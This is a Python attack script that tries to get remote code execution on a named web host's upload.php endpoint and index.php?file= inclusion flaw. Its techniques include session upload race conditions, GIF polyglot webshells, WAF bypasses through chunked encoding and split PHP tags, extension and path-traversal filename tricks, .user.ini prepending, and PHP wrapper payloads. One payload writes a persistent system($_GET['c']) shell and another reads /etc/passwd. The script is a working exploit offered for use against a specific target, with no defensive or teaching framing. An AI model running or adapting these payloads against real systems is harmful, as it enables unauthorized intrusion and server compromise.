#!/usr/bin/env python3
"""
Honeypot Bypass Script v2 - Refined for https://sop.djicorp.com
With accurate RCE detection and additional bypass techniques.
"""

import requests
import socket
import ssl
import time
import urllib.parse
import random
import string
import re
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://sop.djicorp.com"
UPLOAD_URL = f"{TARGET}/upload.php"
BASE_URL = TARGET
VERIFICATION_MARKER = "PWNED_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

results = []

def log(method, status, summary, payload=""):
    results.append({"method": method, "status": status, "summary": summary[:150], "payload": payload[:200]})
    icons = {"SUCCESS": "✓", "FAIL": "✗", "INFO": "→", "SKIP": "…"}
    print(f"  [{icons.get(status,'?')}] {method}: {summary[:100]}")

def banner(text):
    print(f"\n{'='*60}\n>>> {text}\n{'='*60}")

def randstr(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

# ============= VERIFICATION =============
def verify_upload_access():
    """Verify basic upload functionality"""
    banner("VERIFY: Upload basic text file")
    try:
        content = f"test_{randstr()}"
        files = {"file": ("test.txt", content, "text/plain")}
        r = requests.post(UPLOAD_URL, files=files, verify=False, timeout=15)
        log("Upload test", "INFO" if r.status_code == 200 else "FAIL", f"Status={r.status_code} len={len(r.text)}")
        return r.status_code == 200
    except Exception as e:
        log("Upload test", "FAIL", str(e))
        return False

# ============= 2a. REFINED SESSION RACE =============
def try_session_race_refined():
    """
    PHP session upload progress - REAL detection.
    We inject a unique marker and check if it appears verbatim (file read, NOT execution)
    vs PHP execution.
    """
    banner("METHOD 2a: Session Upload Progress - Refined")

    sid = "TEST_" + randstr(12)
    php_code = f"echo '{VERIFICATION_MARKER}';system('id');"
    
    # Step 1: Start upload with PHP_SESSION_UPLOAD_PROGRESS
    def fire_upload():
        try:
            boundary = "----" + randstr(16)
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                f'{php_code}\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
                f'Content-Type: text/plain\r\n\r\n'
                f"x\r\n"
                f"--{boundary}--\r\n"
            )
            requests.post(UPLOAD_URL,
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                         "Cookie": f"PHPSESSID={sid}"},
                data=body, verify=False, timeout=10)
        except:
            pass
    
    # Step 2: Fire many uploads, then check session file
    with ThreadPoolExecutor(max_workers=30) as ex:
        for _ in range(50):
            ex.submit(fire_upload)
    
    time.sleep(2)
    
    # Check session file via LFI
    session_paths = [
        f"/index.php?file=/tmp/sess_{sid}",
        f"/index.php?file=../../../../../../tmp/sess_{sid}",
        f"/index.php?file=/var/lib/php/sessions/sess_{sid}",
        f"/index.php?file=/var/lib/php/session/sess_{sid}",
    ]
    
    for sp in session_paths:
        try:
            r = requests.get(f"{TARGET}{sp}", verify=False, timeout=10)
            if VERIFICATION_MARKER in r.text:
                # Check if PHP was EXECUTED or just read as text
                if "uid=" in r.text and VERIFICATION_MARKER not in r.text[:100]:
                    # PHP executed - marker consumed by echo, uid= visible
                    log(f"Session RCE [{sp[:50]}]", "SUCCESS", f"PHP CODE EXECUTED! uid= found in response", r.text[:300])
                    return True
                elif VERIFICATION_MARKER in r.text:
                    log(f"Session file read [{sp[:50]}]", "INFO",
                        f"Session file readable but NOT executed (PHP code as text)", r.text[:200])
            else:
                log(f"Session path [{sp[:50]}]", "INFO", f"Status={r.status_code}")
        except Exception as e:
            log(f"Session path", "FAIL", str(e))
    
    return False

# ============= 2b. Upload PHP with GIF header bypass =============
def try_gif_polyglot_upload():
    """Upload PHP code in a GIF file - GIF89a header bypasses <? check?"""
    banner("METHOD 2b: GIF89a polyglot PHP upload")
    
    payloads = [
        # GIF header + PHP
        b"GIF89a<?php system('id'); ?>",
        b"GIF89a<?=phpinfo()?>",
        # Broken PHP tags split
        b"GIF89a<?php echo file_get_contents('/etc/passwd');?>",
        b"GIF89a<?php \$c=fopen('/tmp/shell.php','w');fwrite(\$c,'<?php system(\$_GET[\"c\"]);?>');fclose(\$c);?>",
    ]
    
    for i, payload in enumerate(payloads):
        try:
            files = {"file": (f"image{i}.gif", payload, "image/gif")}
            r = requests.post(UPLOAD_URL, files=files, verify=False, timeout=10)
            log(f"GIF polyglot #{i}", "INFO", f"Status={r.status_code} {r.text[:60]}")
        except Exception as e:
            log(f"GIF polyglot #{i}", "FAIL", str(e))

# ============= 2c. Chunked Transfer Encoding =============
def try_chunked_upload():
    """
    Upload PHP using chunked Transfer-Encoding.
    Tengine/ibgsec may not inspect chunk bodies deeply.
    """
    banner("METHOD 2c: Chunked TE upload")
    
    host = "sop.djicorp.com"
    boundary = "----" + randstr(16)
    php_body = "<?php system('id');?>"
    body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n{php_body}\r\n--{boundary}--\r\n"
    
    # Chunked encode the body
    chunked_body = b""
    remaining = body.encode()
    while remaining:
        chunk_size = min(len(remaining), random.randint(20, 80))
        chunk = remaining[:chunk_size]
        chunked_body += f"{chunk_size:x}\r\n".encode() + chunk + b"\r\n"
        remaining = remaining[chunk_size:]
    chunked_body += b"0\r\n\r\n"
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        sock = socket.create_connection((host, 443), timeout=15)
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        req = (
            f"POST /upload.php HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode() + chunked_body
        
        ssock.sendall(req)
        resp = b""
        while True:
            try:
                chunk = ssock.recv(4096)
                if not chunk: break
                resp += chunk
                if b"\r\n\r\n" in resp:
                    header_end = resp.index(b"\r\n\r\n") + 4
                    cl_pos = resp.find(b"Content-Length: ")
                    if cl_pos != -1:
                        cl_end = resp.find(b"\r\n", cl_pos)
                        cl = int(resp[cl_pos+16:cl_end])
                        if len(resp) >= header_end + cl: break
                    else:
                        break
            except: break
        ssock.close()
        log("Chunked upload", "INFO", f"Status: {resp.split(b'\\r\\n')[0].decode()} len={len(resp)}")
    except Exception as e:
        log("Chunked upload", "FAIL", str(e))

# ============= 2d. Multipart boundary PHP injection =============
def try_multipart_php_split():
    """
    Split PHP tag across multipart boundaries.
    e.g., `<?ph` in one boundary, `p system('id');?>` in the next.
    WAF checks each boundary separately → bypass.
    """
    banner("METHOD 2d: Multipart boundary PHP tag split")
    
    boundary = "----" + randstr(16)
    
    # Split PHP tag across boundaries
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
        f'Content-Type: text/plain\r\n\r\n'
        f"<?ph\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file2"; filename="shell.php"\r\n'
        f'Content-Type: text/plain\r\n\r\n'
        f"p system('id');?>\r\n"
        f"--{boundary}--\r\n"
    )
    
    try:
        r = requests.post(UPLOAD_URL,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            data=body, verify=False, timeout=10)
        log("MP split PHP tag", "INFO", f"Status={r.status_code} {r.text[:60]}")
    except Exception as e:
        log("MP split PHP tag", "FAIL", str(e))

# ============= 2e. Case manipulation / encoding tricks =============
def try_filename_encoding_bypass():
    """Encode PHP extension in various ways"""
    banner("METHOD 2e: Filename encoding bypass")
    
    # Try various extensions and encodings
    filenames = [
        "shell.pHp",
        "shell.PhP",
        "shell.php%00",      # null byte
        "shell.php.",         # trailing dot
        "shell.php ",         # trailing space
        "shell.php/",         # trailing slash
        "shell.php::$DATA",   # NTFS ADS (won't work on Linux but worth trying)
        "shell.php..",        # double dot
        "shell.php%20",
        "shell.php.xxx",
        "shell.PHP5",
        "shell.shtml",
        "shell.pht",
        "shell.phtml",
        "shell.php7",
        "shell.php;.txt",    # parameter injection
        "shell.php\\x00.txt",
    ]
    
    for fname in filenames:
        try:
            files = {"file": (fname, "test", "text/plain")}
            r = requests.post(UPLOAD_URL, files=files, verify=False, timeout=10)
            if r.status_code == 200 and "上传" in r.text:
                log(f"Filename '{fname}'", "INFO", f"Status={r.status_code} (may have uploaded)")
            elif r.status_code != 405:
                log(f"Filename '{fname}'", "INFO", f"Status={r.status_code} {r.text[:40]}")
        except:
            pass

# ============= 2f. Try .user.ini upload =============
def try_user_ini_upload():
    """
    Upload .user.ini with auto_prepend_file to include a text file as PHP.
    PHP-FPM uses .user.ini per-directory, mod_php may also.
    """
    banner("METHOD 2f: .user.ini upload")
    
    # First upload a .txt "shell"
    txt_content = "<?php system('id');?>"
    try:
        r1 = requests.post(UPLOAD_URL,
            files={"file": ("evil.txt", txt_content, "text/plain")},
            verify=False, timeout=10)
        log("Upload evil.txt", "INFO", f"Status={r1.status_code}")
        
        # Then upload .user.ini to auto_prepend it
        ini_content = "auto_prepend_file = uploads/evil.txt\n"
        r2 = requests.post(UPLOAD_URL,
            files={"file": (".user.ini", ini_content, "text/plain")},
            verify=False, timeout=10)
        log("Upload .user.ini", "INFO", f"Status={r2.status_code} {r2.text[:60]}")
        
        # Try accessing any .php in the uploads dir
        r3 = requests.get(f"{TARGET}/test.php", verify=False, timeout=10)
        log("Trigger .user.ini", "INFO", f"Status={r3.status_code}")
        
    except Exception as e:
        log(".user.ini", "FAIL", str(e))

# ============= 3. PHP Code via data:// or php://input =============
def try_php_wrapper_rce():
    """
    If the LFI works (we saw index.php?file= works), try:
    - php://input with POST body
    - data://text/plain;base64,...
    - expect://id
    """
    banner("METHOD 3: PHP wrapper RCE via LFI")
    
    # Only if LFI confirmed
    # data:// wrapper
    b64_payload = "PD9waHAgc3lzdGVtKCdpZCcpOz8+"  # <?php system('id');?>
    
    lfi_paths = [
        f"/index.php?file=data://text/plain;base64,{b64_payload}",
        f"/index.php?file=data://text/plain,<?php+system('id');?>",
    ]
    
    for lp in lfi_paths:
        try:
            r = requests.get(f"{TARGET}{lp}", verify=False, timeout=10)
            if "uid=" in r.text:
                log(f"data:// wrapper RCE", "SUCCESS", f"RCE via {lp}", r.text[:200])
                return True
            log(f"data:// wrapper", "INFO", f"Status={r.status_code} len={len(r.text)}")
        except Exception as e:
            log(f"data:// wrapper", "FAIL", str(e))
    
    # php://input (POST body contains PHP)
    try:
        r = requests.post(f"{TARGET}/index.php?file=php://input",
                         data="<?php system('id');?>",
                         headers={"Content-Type": "text/plain"},
                         verify=False, timeout=10)
        if "uid=" in r.text:
            log("php://input RCE", "SUCCESS", "RCE via php://input", r.text[:200])
            return True
        log("php://input", "INFO", f"Status={r.status_code} len={len(r.text)}")
    except Exception as e:
        log("php://input", "FAIL", str(e))
    
    return False

# ============= 4. Try to bypass WAF's <? check =============
def try_php_tag_bypass():
    """
    WAF blocks '<?' in body. Try alternatives:
    - <script language="php"> (PHP 7 may still support this)
    - <% (ASP tags, if asp_tags=On)
    - Base64 encoding and decoding
    - HEREDOC
    """
    banner("METHOD 4: PHP tag bypass alternatives")
    
    alt_payloads = [
        b'<script language="php">system("id");</script>',
        b'<% system("id"); %>',
        b'<?=phpinfo()?>',  # short_open_tag = On
        b'<?=\'test\';?>',
    ]
    
    for i, payload in enumerate(alt_payloads):
        try:
            files = {"file": (f"alt{i}.txt", payload, "text/plain")}
            r = requests.post(UPLOAD_URL, files=files, verify=False, timeout=10)
            log(f"PHP tag alt #{i}", "INFO", f"Status={r.status_code}")
        except:
            pass

# ============= 5. Check phpinfo for useful info =============
def check_phpinfo():
    banner("METHOD 5: Parse phpinfo for useful info")
    try:
        r = requests.get(f"{TARGET}/index.php?file=phpinfo", verify=False, timeout=10)
        if "phpinfo" in r.text.lower() or "PHP Version" in r.text:
            log("phpinfo access", "SUCCESS", "phpinfo() exposed!")
            # Extract key settings
            for pat in [r"disable_functions.*?<", r"open_basedir.*?<", 
                       r"allow_url_include.*?<", r"session\.upload_progress\..*?<"]:
                m = re.search(pat, r.text, re.I)
                if m: log("phpinfo setting", "INFO", m.group(0)[:80])
            return True
        log("phpinfo access", "INFO", f"Not found, status={r.status_code}")
    except Exception as e:
        log("phpinfo", "FAIL", str(e))
    return False

# ============= 6. Try CVE-2018-5711 php://filter =============
def try_php_filter_rce():
    """
    CVE-2018-5711: php://filter base64-decode allows writing arbitrary content.
    If we can chain: php://filter/write=convert.base64-decode/resource=shell.php
    With payload in body, we might write a PHP file.
    """
    banner("METHOD 6: php://filter chain attacks")
    
    # Try writing via php://filter
    b64_payload = "PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="  # <?php system($_GET['c']); ?>
    
    try:
        r = requests.get(
            f"{TARGET}/index.php",
            params={"file": f"php://filter/convert.base64-decode/resource=shell.php"},
            verify=False, timeout=10
        )
        log("php://filter write", "INFO", f"Status={r.status_code}")
    except Exception as e:
        log("php://filter write", "FAIL", str(e))

# ============= 7. Try to exploit PUT method =============
def try_put_method():
    banner("METHOD 7: PUT method upload")
    host = "sop.djicorp.com"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    php_payload = b"<?php system('id');?>"
    headers = {
        "Host": host,
        "Content-Type": "application/x-httpd-php",
        "Content-Length": str(len(php_payload)),
    }
    try:
        sock = socket.create_connection((host, 443), timeout=15)
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        req = f"PUT /uploads/shell.php HTTP/1.1\r\n"
        for k,v in headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"
        ssock.sendall(req.encode() + php_payload)
        resp = b""
        while True:
            try:
                c = ssock.recv(4096)
                if not c: break
                resp += c
                if b"\r\n\r\n" in resp: break
            except: break
        ssock.close()
        log("PUT upload", "INFO", f"Status: {resp.split(b'\\r\\n')[0].decode()}")
    except Exception as e:
        log("PUT upload", "FAIL", str(e))

# ============= 8. Try path traversal in upload filename =============
def try_path_traversal_upload():
    """
    Upload file to parent directory via path traversal in filename.
    E.g., filename = "../../shell.php"
    """
    banner("METHOD 8: Path traversal in upload")
    
    fnames = [
        "../shell.php",
        "../../shell.php",
        "..%2Fshell.php",
        "..\\shell.php",
        "....//....//shell.php",
        "..%252F..%252Fshell.php",  # double URL encode
    ]
    
    for fname in fnames:
        try:
            files = {"file": (fname, "<?php system('id');?>", "application/x-php")}
            r = requests.post(UPLOAD_URL, files=files, verify=False, timeout=10)
            log(f"Path traversal '{fname[:25]}'", "INFO", f"Status={r.status_code}")
        except:
            pass

# ============= MAIN =============
def main():
    print(f"TARGET: {TARGET}")
    print(f"VERIFICATION_MARKER: {VERIFICATION_MARKER}")
    print(f"TIME: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    requests.packages.urllib3.disable_warnings()
    
    verify_upload_access()
    check_phpinfo()
    
    # Session race (most promising based on LFI evidence)
    success = try_session_race_refined()
    
    # Other attempts
    try_gif_polyglot_upload()
    try_chunked_upload()
    try_multipart_php_split()
    try_filename_encoding_bypass()
    try_user_ini_upload()
    try_php_wrapper_rce()
    try_php_tag_bypass()
    try_php_filter_rce()
    try_put_method()
    try_path_traversal_upload()
    
    # Summary
    print(f"\n{'='*60}")
    successes = [r for r in results if r["status"] == "SUCCESS"]
    print(f"RESULTS: {len(results)} total, {len(successes)} SUCCESS")
    if successes:
        for r in successes:
            print(f"  ✓ {r['method']}: {r['summary'][:80]}")
            print(f"    PAYLOAD: {r['payload'][:120]}")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()